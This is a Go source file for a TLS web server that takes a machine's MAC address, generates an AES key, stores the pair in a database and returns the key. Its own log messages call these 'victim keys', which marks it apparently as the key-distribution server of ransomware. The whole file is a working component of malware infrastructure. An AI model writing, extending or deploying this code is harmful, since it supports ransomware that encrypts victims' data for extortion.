package main

import (
	"fmt"
	"log"
	"net/http"
)

var SERVER_PORT string

func serveAESKey(w http.ResponseWriter, req *http.Request) {
	w.Header().Set("Context-Type", "text/plain")
	if req.Method == "POST" {
		// Parsing Form data
		if err := req.ParseForm(); err != nil {
			log.Printf("Parse-Form error: %v", err)
		}
		macAddress := req.FormValue("mac")
		if macAddress == "" {
			w.Write([]byte("Invalid Request."))
			log.Println("Invalid Request, no mac Address supplied.")
			return
		}
		log.Println("User mac Address:", macAddress)

		if !IsMacAddress(macAddress) {
			w.Write([]byte("Invalid Request."))
			log.Println("Invalid mac address supplied.")
			return
		}

		// Get DB-Connection
		dbConn := GetDatabaseConnection()
		defer dbConn.Close()
		userAESKey := GenerateAESKey()
		InsertKeyMacPair(macAddress, userAESKey, dbConn)

		w.Write([]byte(userAESKey))
		return
	} else {
		w.Write([]byte("Only POST allowed."))
		return
	}
}

func main() {
	log.Println("[*] Started server on port ", SERVER_PORT)
	log.Println("[*] Creating Database to store victim keys ...")
	dbConn := GetDatabaseConnection()
	SetupDatabase(dbConn)
	dbConn.Close()

	http.HandleFunc("/key", serveAESKey)
	err := http.ListenAndServeTLS(fmt.Sprintf("0.0.0.0:%s", SERVER_PORT), "server.crt", "server.key", nil)
	if err != nil {
		log.Fatal("Server error: ", err)
	}
}
